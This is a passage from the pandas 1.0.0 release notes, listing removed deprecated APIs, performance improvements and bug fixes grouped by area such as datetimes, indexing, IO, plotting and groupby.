(:issue:`29787`)\n- Passing a dtype alias (e.g. 'datetime64[ns, UTC]') to :class:`DatetimeTZDtype` is no longer allowed, use :meth:`DatetimeTZDtype.construct_from_string` instead (:issue:`23990`)\n- Removed the previously deprecated keyword \"skip_footer\" from :func:`read_excel`; use \"skipfooter\" instead (:issue:`18836`)\n- :func:`read_excel` no longer allows an integer value for the parameter ``usecols``, instead pass a list of integers from 0 to ``usecols`` inclusive (:issue:`23635`)\n- Removed the previously deprecated keyword \"convert_datetime64\" from :meth:`DataFrame.to_records` (:issue:`18902`)\n- Removed ``IntervalIndex.from_intervals`` in favor of the :class:`IntervalIndex` constructor (:issue:`19263`)\n- Changed the default \"keep_tz\" argument in :meth:`DatetimeIndex.to_series` from ``None`` to ``True`` (:issue:`23739`)\n- Removed ``api.types.is_period`` and ``api.types.is_datetimetz`` (:issue:`23917`)\n- Ability to read pickles containing :class:`Categorical` instances created with pre-0.16 version of pandas has been removed (:issue:`27538`)\n- Removed ``pandas.tseries.plotting.tsplot`` (:issue:`18627`)\n- Removed the previously deprecated keywords \"reduce\" and \"broadcast\" from :meth:`DataFrame.apply` (:issue:`18577`)\n- Removed the previously deprecated ``assert_raises_regex`` function in ``pandas._testing`` (:issue:`29174`)\n- Removed the previously deprecated ``FrozenNDArray`` class in ``pandas.core.indexes.frozen`` (:issue:`29335`)\n- Removed the previously deprecated keyword \"nthreads\" from :func:`read_feather`, use \"use_threads\" instead (:issue:`23053`)\n- Removed ``Index.is_lexsorted_for_tuple`` (:issue:`29305`)\n- Removed support for nested renaming in :meth:`DataFrame.aggregate`, :meth:`Series.aggregate`, :meth:`core.groupby.DataFrameGroupBy.aggregate`, :meth:`core.groupby.SeriesGroupBy.aggregate`, :meth:`core.window.rolling.Rolling.aggregate` (:issue:`29608`)\n- Removed ``Series.valid``; use :meth:`Series.dropna` instead (:issue:`18800`)\n- Removed ``DataFrame.is_copy``, ``Series.is_copy`` (:issue:`18812`)\n- Removed ``DataFrame.get_ftype_counts``, ``Series.get_ftype_counts`` (:issue:`18243`)\n- Removed ``DataFrame.ftypes``, ``Series.ftypes``, ``Series.ftype`` (:issue:`26744`)\n- Removed ``Index.get_duplicates``, use ``idx[idx.duplicated()].unique()`` instead (:issue:`20239`)\n- Removed ``Series.clip_upper``, ``Series.clip_lower``, ``DataFrame.clip_upper``, ``DataFrame.clip_lower`` (:issue:`24203`)\n- Removed the ability to alter :attr:`DatetimeIndex.freq`, :attr:`TimedeltaIndex.freq`, or :attr:`PeriodIndex.freq` (:issue:`20772`)\n- Removed ``DatetimeIndex.offset`` (:issue:`20730`)\n- Removed ``DatetimeIndex.asobject``, ``TimedeltaIndex.asobject``, ``PeriodIndex.asobject``, use ``astype(object)`` instead (:issue:`29801`)\n- Removed the previously deprecated keyword \"order\" from :func:`factorize` (:issue:`19751`)\n- Removed the previously deprecated keyword \"encoding\" from :func:`read_stata` and :meth:`DataFrame.to_stata` (:issue:`21400`)\n- Changed the default \"sort\" argument in :func:`concat` from ``None`` to ``False`` (:issue:`20613`)\n- Removed the previously deprecated keyword \"raise_conflict\" from :meth:`DataFrame.update`, use \"errors\" instead (:issue:`23585`)\n- Removed the previously deprecated keyword \"n\" from :meth:`DatetimeIndex.shift`, :meth:`TimedeltaIndex.shift`, :meth:`PeriodIndex.shift`, use \"periods\" instead (:issue:`22458`)\n- Removed the previously deprecated keywords \"how\", \"fill_method\", and \"limit\" from :meth:`DataFrame.resample` (:issue:`30139`)\n- Passing an integer to :meth:`Series.fillna` or :meth:`DataFrame.fillna` with ``timedelta64[ns]`` dtype now raises ``TypeError`` (:issue:`24694`)\n- Passing multiple axes to :meth:`DataFrame.dropna` is no longer supported (:issue:`20995`)\n- Removed ``Series.nonzero``, use ``to_numpy().nonzero()`` instead (:issue:`24048`)\n- Passing floating dtype ``codes`` to :meth:`Categorical.from_codes` is no longer supported, pass ``codes.astype(np.int64)`` instead (:issue:`21775`)\n- Removed the previously deprecated keyword \"pat\" from :meth:`Series.str.partition` and :meth:`Series.str.rpartition`, use \"sep\" instead (:issue:`23767`)\n- Removed ``Series.put`` (:issue:`27106`)\n- Removed ``Series.real``, ``Series.imag`` (:issue:`27106`)\n- Removed ``Series.to_dense``, ``DataFrame.to_dense`` (:issue:`26684`)\n- Removed ``Index.dtype_str``, use ``str(index.dtype)`` instead (:issue:`27106`)\n- :meth:`Categorical.ravel` returns a :class:`Categorical` instead of a ``ndarray`` (:issue:`27199`)\n- The 'outer' method on Numpy ufuncs, e.g. ``np.subtract.outer`` operating on :class:`Series` objects is no longer supported, and will raise ``NotImplementedError`` (:issue:`27198`)\n- Removed ``Series.get_dtype_counts`` and ``DataFrame.get_dtype_counts`` (:issue:`27145`)\n- Changed the default \"fill_value\" argument in :meth:`Categorical.take` from ``True`` to ``False`` (:issue:`20841`)\n- Changed the default value for the ``raw`` argument in :func:`Series.rolling().apply() <.Rolling.apply>`, :func:`DataFrame.rolling().apply() <.Rolling.apply>`, :func:`Series.expanding().apply() <.Expanding.apply>`, and :func:`DataFrame.expanding().apply() <.Expanding.apply>` from ``None`` to ``False`` (:issue:`20584`)\n- Removed deprecated behavior of :meth:`Series.argmin` and :meth:`Series.argmax`, use :meth:`Series.idxmin` and :meth:`Series.idxmax` for the old behavior (:issue:`16955`)\n- Passing a tz-aware ``datetime.datetime`` or :class:`Timestamp` into the :class:`Timestamp` constructor with the ``tz`` argument now raises a ``ValueError`` (:issue:`23621`)\n- Removed ``Series.base``, ``Index.base``, ``Categorical.base``, ``Series.flags``, ``Index.flags``, ``PeriodArray.flags``, ``Series.strides``, ``Index.strides``, ``Series.itemsize``, ``Index.itemsize``, ``Series.data``, ``Index.data`` (:issue:`20721`)\n- Changed :meth:`Timedelta.resolution` to match the behavior of the standard library ``datetime.timedelta.resolution``, for the old behavior, use :meth:`Timedelta.resolution_string` (:issue:`26839`)\n- Removed ``Timestamp.weekday_name``, ``DatetimeIndex.weekday_name``, and ``Series.dt.weekday_name`` (:issue:`18164`)\n- Removed the previously deprecated keyword \"errors\" in :meth:`Timestamp.tz_localize`, :meth:`DatetimeIndex.tz_localize`, and :meth:`Series.tz_localize` (:issue:`22644`)\n- Changed the default \"ordered\" argument in :class:`CategoricalDtype` from ``None`` to ``False`` (:issue:`26336`)\n- :meth:`Series.set_axis` and :meth:`DataFrame.set_axis` now require \"labels\" as the first argument and \"axis\" as an optional named parameter (:issue:`30089`)\n- Removed ``to_msgpack``, ``read_msgpack``, ``DataFrame.to_msgpack``, ``Series.to_msgpack`` (:issue:`27103`)\n- Removed ``Series.compress`` (:issue:`21930`)\n- Removed the previously deprecated keyword \"fill_value\" from :meth:`Categorical.fillna`, use \"value\" instead (:issue:`19269`)\n- Removed the previously deprecated keyword \"data\" from :func:`andrews_curves`, use \"frame\" instead (:issue:`6956`)\n- Removed the previously deprecated keyword \"data\" from :func:`parallel_coordinates`, use \"frame\" instead (:issue:`6956`)\n- Removed the previously deprecated keyword \"colors\" from :func:`parallel_coordinates`, use \"color\" instead (:issue:`6956`)\n- Removed the previously deprecated keywords \"verbose\" and \"private_key\" from :func:`read_gbq` (:issue:`30200`)\n- Calling ``np.array`` and ``np.asarray`` on tz-aware :class:`Series` and :class:`DatetimeIndex` will now return an object array of tz-aware :class:`Timestamp` (:issue:`24596`)\n-\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Performance improvement in :class:`DataFrame` arithmetic and comparison operations with scalars (:issue:`24990`, :issue:`29853`)\n- Performance improvement in indexing with a non-unique :class:`IntervalIndex` (:issue:`27489`)\n- Performance improvement in :attr:`MultiIndex.is_monotonic` (:issue:`27495`)\n- Performance improvement in :func:`cut` when ``bins`` is an :class:`IntervalIndex` (:issue:`27668`)\n- Performance improvement when initializing a :class:`DataFrame` using a ``range`` (:issue:`30171`)\n- Performance improvement in :meth:`DataFrame.corr` when ``method`` is ``\"spearman\"`` (:issue:`28139`)\n- Performance improvement in :meth:`DataFrame.replace` when provided a list of values to replace (:issue:`28099`)\n- Performance improvement in :meth:`DataFrame.select_dtypes` by using vectorization instead of iterating over a loop (:issue:`28317`)\n- Performance improvement in :meth:`Categorical.searchsorted` and  :meth:`CategoricalIndex.searchsorted` (:issue:`28795`)\n- Performance improvement when comparing a :class:`Categorical` with a scalar and the scalar is not found in the categories (:issue:`29750`)\n- Performance improvement when checking if values in a :class:`Categorical` are equal, equal or larger or larger than a given scalar.\n  The improvement is not present if checking if the :class:`Categorical` is less than or less than or equal than the scalar (:issue:`29820`)\n- Performance improvement in :meth:`Index.equals` and  :meth:`MultiIndex.equals` (:issue:`29134`)\n- Performance improvement in :func:`~pandas.api.types.infer_dtype` when ``skipna`` is ``True`` (:issue:`28814`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n\nCategorical\n^^^^^^^^^^^\n\n- Added test to assert the :func:`fillna` raises the correct ``ValueError`` message when the value isn't a value from categories (:issue:`13628`)\n- Bug in :meth:`Categorical.astype` where ``NaN`` values were handled incorrectly when casting to int (:issue:`28406`)\n- :meth:`DataFrame.reindex` with a :class:`CategoricalIndex` would fail when the targets contained duplicates, and wouldn't fail if the source contained duplicates (:issue:`28107`)\n- Bug in :meth:`Categorical.astype` not allowing for casting to extension dtypes (:issue:`28668`)\n- Bug where :func:`merge` was unable to join on categorical and extension dtype columns (:issue:`28668`)\n- :meth:`Categorical.searchsorted` and :meth:`CategoricalIndex.searchsorted` now work on unordered categoricals also (:issue:`21667`)\n- Added test to assert roundtripping to parquet with :func:`DataFrame.to_parquet` or :func:`read_parquet` will preserve Categorical dtypes for string types (:issue:`27955`)\n- Changed the error message in :meth:`Categorical.remove_categories` to always show the invalid removals as a set (:issue:`28669`)\n- Using date accessors on a categorical dtyped :class:`Series` of datetimes was not returning an object of the\n  same type as if one used the :meth:`.str.` / :meth:`.dt.` on a :class:`Series` of that type. E.g. when accessing :meth:`Series.dt.tz_localize` on a\n  :class:`Categorical` with duplicate entries, the accessor was skipping duplicates (:issue:`27952`)\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` that would give incorrect results on categorical data (:issue:`26988`)\n- Bug where calling :meth:`Categorical.min` or :meth:`Categorical.max` on an empty Categorical would raise a numpy exception (:issue:`30227`)\n- The following methods now also correctly output values for unobserved categories when called through ``groupby(..., observed=False)`` (:issue:`17605`)\n  * :meth:`core.groupby.SeriesGroupBy.count`\n  * :meth:`core.groupby.SeriesGroupBy.size`\n  * :meth:`core.groupby.SeriesGroupBy.nunique`\n  * :meth:`core.groupby.SeriesGroupBy.nth`\n\n\nDatetimelike\n^^^^^^^^^^^^\n- Bug in :meth:`Series.__setitem__` incorrectly casting ``np.timedelta64(\"NaT\")`` to ``np.datetime64(\"NaT\")`` when inserting into a :class:`Series` with datetime64 dtype (:issue:`27311`)\n- Bug in :meth:`Series.dt` property lookups when the underlying data is read-only (:issue:`27529`)\n- Bug in ``HDFStore.__getitem__`` incorrectly reading tz attribute created in Python 2 (:issue:`26443`)\n- Bug in :func:`to_datetime` where passing arrays of malformed ``str`` with errors=\"coerce\" could incorrectly lead to raising ``ValueError`` (:issue:`28299`)\n- Bug in :meth:`core.groupby.SeriesGroupBy.nunique` where ``NaT`` values were interfering with the count of unique values (:issue:`27951`)\n- Bug in :class:`Timestamp` subtraction when subtracting a :class:`Timestamp` from a ``np.datetime64`` object incorrectly raising ``TypeError`` (:issue:`28286`)\n- Addition and subtraction of integer or integer-dtype arrays with :class:`Timestamp` will now raise ``NullFrequencyError`` instead of ``ValueError`` (:issue:`28268`)\n- Bug in :class:`Series` and :class:`DataFrame` with integer dtype failing to raise ``TypeError`` when adding or subtracting a ``np.datetime64`` object (:issue:`28080`)\n- Bug in :meth:`Series.astype`, :meth:`Index.astype`, and :meth:`DataFrame.astype` failing to handle ``NaT`` when casting to an integer dtype (:issue:`28492`)\n- Bug in :class:`Week` with ``weekday`` incorrectly raising ``AttributeError`` instead of ``TypeError`` when adding or subtracting an invalid type (:issue:`28530`)\n- Bug in :class:`DataFrame` arithmetic operations when operating with a :class:`Series` with dtype ``'timedelta64[ns]'`` (:issue:`28049`)\n- Bug in :func:`core.groupby.generic.SeriesGroupBy.apply` raising ``ValueError`` when a column in the original DataFrame is a datetime and the column labels are not standard integers (:issue:`28247`)\n- Bug in :func:`pandas._config.localization.get_locales` where the ``locales -a`` encodes the locales list as windows-1252 (:issue:`23638`, :issue:`24760`, :issue:`27368`)\n- Bug in :meth:`Series.var` failing to raise ``TypeError`` when called with ``timedelta64[ns]`` dtype (:issue:`28289`)\n- Bug in :meth:`DatetimeIndex.strftime` and :meth:`Series.dt.strftime` where ``NaT`` was converted to the string ``'NaT'`` instead of ``np.nan`` (:issue:`29578`)\n- Bug in masking datetime-like arrays with a boolean mask of an incorrect length not raising an ``IndexError`` (:issue:`30308`)\n- Bug in :attr:`Timestamp.resolution` being a property instead of a class attribute (:issue:`29910`)\n- Bug in :func:`pandas.to_datetime` when called with ``None`` raising ``TypeError`` instead of returning ``NaT`` (:issue:`30011`)\n- Bug in :func:`pandas.to_datetime` failing for ``deque`` objects when using ``cache=True`` (the default) (:issue:`29403`)\n- Bug in :meth:`Series.item` with ``datetime64`` or ``timedelta64`` dtype, :meth:`DatetimeIndex.item`, and :meth:`TimedeltaIndex.item` returning an integer instead of a :class:`Timestamp` or :class:`Timedelta` (:issue:`30175`)\n- Bug in :class:`DatetimeIndex` addition when adding a non-optimized :class:`DateOffset` incorrectly dropping timezone information (:issue:`30336`)\n- Bug in :meth:`DataFrame.drop` where attempting to drop non-existent values from a DatetimeIndex would yield a confusing error message (:issue:`30399`)\n- Bug in :meth:`DataFrame.append` would remove the timezone-awareness of new data (:issue:`30238`)\n- Bug in :meth:`Series.cummin` and :meth:`Series.cummax` with timezone-aware dtype incorrectly dropping its timezone (:issue:`15553`)\n- Bug in :class:`DatetimeArray`, :class:`TimedeltaArray`, and :class:`PeriodArray` where inplace addition and subtraction did not actually operate inplace (:issue:`24115`)\n- Bug in :func:`pandas.to_datetime` when called with ``Series`` storing ``IntegerArray`` raising ``TypeError`` instead of returning ``Series`` (:issue:`30050`)\n- Bug in :func:`date_range` with custom business hours as ``freq`` and given number of ``periods`` (:issue:`30593`)\n- Bug in :class:`PeriodIndex` comparisons with incorrectly casting integers to :class:`Period` objects, inconsistent with the :class:`Period` comparison behavior (:issue:`30722`)\n- Bug in :meth:`DatetimeIndex.insert` raising a ``ValueError`` instead of a ``TypeError`` when trying to insert a timezone-aware :class:`Timestamp` into a timezone-naive :class:`DatetimeIndex`, or vice-versa (:issue:`30806`)\n\nTimedelta\n^^^^^^^^^\n- Bug in subtracting a :class:`TimedeltaIndex` or :class:`TimedeltaArray` from a ``np.datetime64`` object (:issue:`29558`)\n-\n\nTimezones\n^^^^^^^^^\n\n-\n\n\nNumeric\n^^^^^^^\n- Bug in :meth:`DataFrame.quantile` with zero-column :class:`DataFrame` incorrectly raising (:issue:`23925`)\n- :class:`DataFrame` flex inequality comparisons methods (:meth:`DataFrame.lt`, :meth:`DataFrame.le`, :meth:`DataFrame.gt`, :meth:`DataFrame.ge`) with object-dtype and ``complex`` entries failing to raise ``TypeError`` like their :class:`Series` counterparts (:issue:`28079`)\n- Bug in :class:`DataFrame` logical operations (``&``, ``|``, ``^``) not matching :class:`Series` behavior by filling NA values (:issue:`28741`)\n- Bug in :meth:`DataFrame.interpolate` where specifying axis by name references variable before it is assigned (:issue:`29142`)\n- Bug in :meth:`Series.var` not computing the right value with a nullable integer dtype series not passing through ddof argument (:issue:`29128`)\n- Improved error message when using ``frac`` > 1 and ``replace`` = False (:issue:`27451`)\n- Bug in numeric indexes resulted in it being possible to instantiate an :class:`Int64Index`, :class:`UInt64Index`, or :class:`Float64Index` with an invalid dtype (e.g. datetime-like) (:issue:`29539`)\n- Bug in :class:`UInt64Index` precision loss while constructing from a list with values in the ``np.uint64`` range (:issue:`29526`)\n- Bug in :class:`NumericIndex` construction that caused indexing to fail when integers in the ``np.uint64`` range were used (:issue:`28023`)\n- Bug in :class:`NumericIndex` construction that caused :class:`UInt64Index` to be casted to :class:`Float64Index` when integers in the ``np.uint64`` range were used to index a :class:`DataFrame` (:issue:`28279`)\n- Bug in :meth:`Series.interpolate` when using method=`index` with an unsorted index, would previously return incorrect results. (:issue:`21037`)\n- Bug in :meth:`DataFrame.round` where a :class:`DataFrame` with a :class:`CategoricalIndex` of :class:`IntervalIndex` columns would incorrectly raise a ``TypeError`` (:issue:`30063`)\n- Bug in :meth:`Series.pct_change` and :meth:`DataFrame.pct_change` when there are duplicated indices (:issue:`30463`)\n- Bug in :class:`DataFrame` cumulative operations (e.g. cumsum, cummax) incorrect casting to object-dtype (:issue:`19296`)\n- Bug in :class:`~DataFrame.diff` losing the dtype for extension types (:issue:`30889`)\n- Bug in :class:`DataFrame.diff` raising an ``IndexError`` when one of the columns was a nullable integer dtype (:issue:`30967`)\n\nConversion\n^^^^^^^^^^\n\n-\n\nStrings\n^^^^^^^\n\n- Calling :meth:`Series.str.isalnum` (and other \"ismethods\") on an empty ``Series`` would return an ``object`` dtype instead of ``bool`` (:issue:`29624`)\n-\n\n\nInterval\n^^^^^^^^\n\n- Bug in :meth:`IntervalIndex.get_indexer` where a :class:`Categorical` or :class:`CategoricalIndex` ``target`` would incorrectly raise a ``TypeError`` (:issue:`30063`)\n- Bug in ``pandas.core.dtypes.cast.infer_dtype_from_scalar`` where passing ``pandas_dtype=True`` did not infer :class:`IntervalDtype` (:issue:`30337`)\n- Bug in :class:`Series` constructor where constructing a ``Series`` from a ``list`` of :class:`Interval` objects resulted in ``object`` dtype instead of :class:`IntervalDtype` (:issue:`23563`)\n- Bug in :class:`IntervalDtype` where the ``kind`` attribute was incorrectly set as ``None`` instead of ``\"O\"`` (:issue:`30568`)\n- Bug in :class:`IntervalIndex`, :class:`~arrays.IntervalArray`, and :class:`Series` with interval data where equality comparisons were incorrect (:issue:`24112`)\n\nIndexing\n^^^^^^^^\n\n- Bug in assignment using a reverse slicer (:issue:`26939`)\n- Bug in :meth:`DataFrame.explode` would duplicate frame in the presence of duplicates in the index (:issue:`28010`)\n- Bug in reindexing a :meth:`PeriodIndex` with another type of index that contained a ``Period`` (:issue:`28323`) (:issue:`28337`)\n- Fix assignment of column via ``.loc`` with numpy non-ns datetime type (:issue:`27395`)\n- Bug in :meth:`Float64Index.astype` where ``np.inf`` was not handled properly when casting to an integer dtype (:issue:`28475`)\n- :meth:`Index.union` could fail when the left contained duplicates (:issue:`28257`)\n- Bug when indexing with ``.loc`` where the index was a :class:`CategoricalIndex` with non-string categories didn't work (:issue:`17569`, :issue:`30225`)\n- :meth:`Index.get_indexer_non_unique` could fail with ``TypeError`` in some cases, such as when searching for ints in a string index (:issue:`28257`)\n- Bug in :meth:`Float64Index.get_loc` incorrectly raising ``TypeError`` instead of ``KeyError`` (:issue:`29189`)\n- Bug in :meth:`DataFrame.loc` with incorrect dtype when setting Categorical value in 1-row DataFrame (:issue:`25495`)\n- :meth:`MultiIndex.get_loc` can't find missing values when input includes missing values (:issue:`19132`)\n- Bug in :meth:`Series.__setitem__` incorrectly assigning values with boolean indexer when the length of new data matches the number of ``True`` values and new data is not a ``Series`` or an ``np.array`` (:issue:`30567`)\n- Bug in indexing with a :class:`PeriodIndex` incorrectly accepting integers representing years, use e.g. ``ser.loc[\"2007\"]`` instead of ``ser.loc[2007]`` (:issue:`30763`)\n\nMissing\n^^^^^^^\n\n-\n\nMultiIndex\n^^^^^^^^^^\n\n- Constructor for :class:`MultiIndex` verifies that the given ``sortorder`` is compatible with the actual ``lexsort_depth``  if ``verify_integrity`` parameter is ``True`` (the default) (:issue:`28735`)\n- Series and MultiIndex ``.drop`` with ``MultiIndex`` raise exception if labels not in given in level (:issue:`8594`)\n-\n\nIO\n^^\n\n- :meth:`read_csv` now accepts binary mode file buffers when using the Python csv engine (:issue:`23779`)\n- Bug in :meth:`DataFrame.to_json` where using a Tuple as a column or index value and using ``orient=\"columns\"`` or ``orient=\"index\"`` would produce invalid JSON (:issue:`20500`)\n- Improve infinity parsing. :meth:`read_csv` now interprets ``Infinity``, ``+Infinity``, ``-Infinity`` as floating point values (:issue:`10065`)\n- Bug in :meth:`DataFrame.to_csv` where values were truncated when the length of ``na_rep`` was shorter than the text input data. (:issue:`25099`)\n- Bug in :func:`DataFrame.to_string` where values were truncated using display options instead of outputting the full content (:issue:`9784`)\n- Bug in :meth:`DataFrame.to_json` where a datetime column label would not be written out in ISO format with ``orient=\"table\"`` (:issue:`28130`)\n- Bug in :func:`DataFrame.to_parquet` where writing to GCS would fail with ``engine='fastparquet'`` if the file did not already exist (:issue:`28326`)\n- Bug in :func:`read_hdf` closing stores that it didn't open when Exceptions are raised (:issue:`28699`)\n- Bug in :meth:`DataFrame.read_json` where using ``orient=\"index\"`` would not maintain the order (:issue:`28557`)\n- Bug in :meth:`DataFrame.to_html` where the length of the ``formatters`` argument was not verified (:issue:`28469`)\n- Bug in :meth:`DataFrame.read_excel` with ``engine='ods'`` when ``sheet_name`` argument references a non-existent sheet (:issue:`27676`)\n- Bug in :meth:`pandas.io.formats.style.Styler` formatting for floating values not displaying decimals correctly (:issue:`13257`)\n- Bug in :meth:`DataFrame.to_html` when using ``formatters=<list>`` and ``max_cols`` together. (:issue:`25955`)\n- Bug in :meth:`Styler.background_gradient` not able to work with dtype ``Int64`` (:issue:`28869`)\n- Bug in :meth:`DataFrame.to_clipboard` which did not work reliably in ipython (:issue:`22707`)\n- Bug in :func:`read_json` where default encoding was not set to ``utf-8`` (:issue:`29565`)\n- Bug in :class:`PythonParser` where str and bytes were being mixed when dealing with the decimal field (:issue:`29650`)\n- :meth:`read_gbq` now accepts ``progress_bar_type`` to display progress bar while the data downloads. (:issue:`29857`)\n- Bug in :func:`pandas.io.json.json_normalize` where a missing value in the location specified by ``record_path`` would raise a ``TypeError`` (:issue:`30148`)\n- :func:`read_excel` now accepts binary data (:issue:`15914`)\n- Bug in :meth:`read_csv` in which encoding handling was limited to just the string ``utf-16`` for the C engine (:issue:`24130`)\n\nPlotting\n^^^^^^^^\n\n- Bug in :meth:`Series.plot` not able to plot boolean values (:issue:`23719`)\n- Bug in :meth:`DataFrame.plot` not able to plot when no rows (:issue:`27758`)\n- Bug in :meth:`DataFrame.plot` producing incorrect legend markers when plotting multiple series on the same axis (:issue:`18222`)\n- Bug in :meth:`DataFrame.plot` when ``kind='box'`` and data contains datetime or timedelta data. These types are now automatically dropped (:issue:`22799`)\n- Bug in :meth:`DataFrame.plot.line` and :meth:`DataFrame.plot.area` produce wrong xlim in x-axis (:issue:`27686`, :issue:`25160`, :issue:`24784`)\n- Bug where :meth:`DataFrame.boxplot` would not accept a ``color`` parameter like :meth:`DataFrame.plot.box` (:issue:`26214`)\n- Bug in the ``xticks`` argument being ignored for :meth:`DataFrame.plot.bar` (:issue:`14119`)\n- :func:`set_option` now validates that the plot backend provided to ``'plotting.backend'`` implements the backend when the option is set, rather than when a plot is created (:issue:`28163`)\n- :meth:`DataFrame.plot` now allow a ``backend`` keyword argument to allow changing between backends in one session (:issue:`28619`).\n- Bug in color validation incorrectly raising for non-color styles (:issue:`29122`).\n- Allow :meth:`DataFrame.plot.scatter` to plot ``objects`` and ``datetime`` type data (:issue:`18755`, :issue:`30391`)\n- Bug in :meth:`DataFrame.hist`, ``xrot=0`` does not work with ``by`` and subplots (:issue:`30288`).\n\nGroupBy/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Bug in :meth:`core.groupby.DataFrameGroupBy.apply` only showing output from a single group when function returns an :class:`Index` (:issue:`28652`)\n- Bug in :meth:`DataFrame.groupby` with multiple groups where an ``IndexError`` would be raised if any group contained all NA values (:issue:`20519`)\n- Bug in :meth:`.Resampler.size` and :meth:`.Resampler.count` returning wrong dtype when used with an empty :class:`Series` or :class:`DataFrame` (:issue:`28427`)\n- Bug in :meth:`DataFrame.rolling` not allowing for rolling over datetimes when ``axis=1`` (:issue:`28192`)\n- Bug in :meth:`DataFrame.rolling` not allowing rolling over multi-index levels (:issue:`15584`).\n- Bug in :meth:`DataFrame.rolling` not allowing rolling on monotonic decreasing time indexes (:issue:`19248`).\n- Bug in :meth:`DataFrame.groupby` not offering selection by column name when ``axis=1`` (:issue:`27614`)\n- Bug in :meth:`core.groupby.DataFrameGroupby.agg` not able to use lambda function with named aggregation (:issue:`27519`)\n- Bug in :meth:`DataFrame.groupby` losing column name information when grouping by a categorical column (:issue:`28787`)\n- Remove error raised due to duplicated input functions in named aggregation in :meth:`DataFrame.groupby` and :meth:`Series.groupby`. Previously error will be raised if the same function is applied on the same column and now it is allowed if new assigned names are different. (:issue:`28426`)\n- :meth:`core.groupby.SeriesGroupBy.value_counts` will be able to handle the case even when the :class:`Grouper` makes empty groups (:issue:`28479`)\n- Bug in :meth:`core.window.rolling.Rolling.quantile` ignoring ``interpolation`` keyword argument when used within a groupby (:issue:`28779`)\n- Bug in :meth:`DataFrame.groupby` where ``any``, ``all``, ``nunique`` and transform functions would incorrectly handle duplicate column labels (:issue:`21668`)\n- Bug in :meth:`core.groupby.DataFrameGroupBy.agg` with timezone-aware datetime64 column incorrectly casting results to the original dtype (:issue:`29641`)\n- Bug in :meth:`DataFrame.groupby` when using axis=1 and having a single level columns index (:issue:`30208`)\n- Bug in :meth:`DataFrame.groupby` when using nunique on axis=1 (:issue:`30253`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` with multiple list-like q value and integer column names (:issue:`30289`)\n- Bug in :meth:`.DataFrameGroupBy.pct_change` and :meth:`.SeriesGroupBy.pct_change` causes ``TypeError`` when ``fill_method`` is ``None`` (:issue:`30463`)\n- Bug in :meth:`Rolling.count` and :meth:`Expanding.count` argument where ``min_periods`` was ignored (:issue:`26996`)\n\nReshaping\n^^^^^^^^^\n\n- Bug in :meth:`DataFrame.apply` that caused incorrect output with empty :class:`DataFrame` (:issue:`28202`, :issue:`21959`)\n- Bug in :meth:`DataFrame.stack` not handling non-unique indexes correctly when creating MultiIndex (:issue:`28301`)\n- Bug in :meth:`pivot_table` not returning correct type ``float`` when ``margins=True`` and ``aggfunc='mean'`` (:issue:`24893`)\n- Bug :func:`merge_asof` could not use :class:`datetime.timedelta` for ``tolerance`` kwarg (:issue:`28098`)\n- Bug in :func:`merge`, did not append suffixes correctly with MultiIndex (:issue:`28518`)\n- :func:`qcut` and :func:`cut` now handle boolean input (:issue:`20303`)\n- Fix to ensure all int dtypes can be used in :func:`merge_asof` when using a tolerance value. Previously every non-int64 type would raise an erroneous ``MergeError`` (:issue:`28870`).\n- Better error message in :func:`get_dummies` when ``columns`` isn't a list-like value (:issue:`28383`)\n- Bug in :meth:`Index.join` that caused infinite recursion error for mismatched ``MultiIndex`` name orders. (:issue:`25760`, :issue:`28956`)\n- Bug :meth:`Series.pct_change` where supplying an anchored frequency would throw a ``ValueError`` (:issue:`28664`)\n- Bug where :meth:`DataFrame.equals` returned True incorrectly in some cases when two DataFrames had the same columns in different orders (:issue:`28839`)\n- Bug in :meth:`DataFrame.replace` that caused non-numeric replacer's dtype not respected (:issue:`26632`)\n- Bug in :func:`melt` where supplying mixed strings and numeric values for ``id_vars`` or ``value_vars`` would incorrectly raise a ``ValueError`` (:issue:`29718`)\n- Dtypes are now preserved when transposing a ``DataFrame`` where each column is the same extension dtype (:issue:`30091`)\n- Bug in :func:`merge_asof` merging on a tz-aware ``left_index`` and ``right_on`` a tz-aware column (:issue:`29864`)\n- Improved error message and docstring in :func:`cut` and :func:`qcut` when ``labels=True`` (:issue:`13318`)\n- Bug in missing ``fill_na`` parameter to :meth:`DataFrame.unstack` with list of levels (:issue:`30740`)\n\nSparse\n^^^^^^\n- Bug in :class:`SparseDataFrame` arithmetic operations incorrectly casting inputs to float (:issue:`28107`)\n- Bug in ``DataFrame.sparse`` returning a ``Series`` when there was a column named ``sparse`` rather than the accessor (:issue:`30758`)\n- Fixed :meth:`operator.xor` with a boolean-dtype ``SparseArray``. Now returns a sparse result, rather than object dtype (:issue:`31025`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n\n- Bug in :class:`arrays.PandasArray` when setting a scalar string (:issue:`28118`, :issue:`28150`).\n- Bug where nullable integers could not be compared to strings (:issue:`28930`)\n- Bug where :class:`DataFrame` constructor raised ``ValueError`` with list-like data and ``dtype`` specified (:issue:`30280`)\n\nOther\n^^^^^\n- Trying to set the ``display.precision``, ``display.max_rows`` or ``display.max_columns`` using :meth:`set_option` to anything but a ``None`` or a positive int will raise a ``ValueError`` (:issue:`23348`)\n- Using :meth:`DataFrame.replace` with overlapping keys in a nested dictionary will no longer raise, now matching the behavior of a flat dictionary (:issue:`27660`)\n- :meth:`DataFrame.to_csv` and :meth:`Series.to_csv` now support dicts as ``compression`` argument with key ``'method'`` being the compression method and others as additional compression options when the compression method is ``'zip'``. (:issue:`26023`)\n- Bug in :meth:`Series.diff` where a boolean series would incorrectly raise a ``TypeError`` (:issue:`17294`)\n- :meth:`Series.append` will no longer raise a ``TypeError`` when passed a tuple of ``Series`` (:issue:`28410`)\n- Fix corrupted error message when calling ``pandas.libs._json.encode()`` on a 0d array (:issue:`18878`)\n- Backtick quoting in :meth:`DataFrame.query` and :meth:`DataFrame.eval` can now also be used to use invalid identifiers like names that start with a digit, are python keywords, or are using single character operators. (:issue:`27017`)\n- Bug in ``pd.core.util.hashing.hash_pandas_object`` where arrays containing tuples were incorrectly treated as non-hashable (:issue:`28969`)\n- Bug in :meth:`DataFrame.append` that raised ``IndexError`` when appending with empty list (:issue:`28769`)\n- 